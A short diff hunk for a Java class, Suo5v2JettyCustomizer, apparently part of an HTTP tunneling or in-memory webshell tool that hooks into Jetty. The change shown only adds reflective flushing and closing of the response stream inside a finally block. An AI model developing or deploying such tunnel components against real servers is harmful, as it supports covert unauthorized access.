@@ -216,7 +216,11 @@ public class Suo5v2JettyCustomizer implements HttpConfiguration.Customizer, Runn
             }
         } catch (Throwable ignored) {
         } finally {
-
+            try {
+                OutputStream out = (OutputStream) response.getClass().getMethod("getOutputStream").invoke(response);
+                out.flush();
+                out.close();
+            } catch (Throwable ignore) {}
         }
     }
 
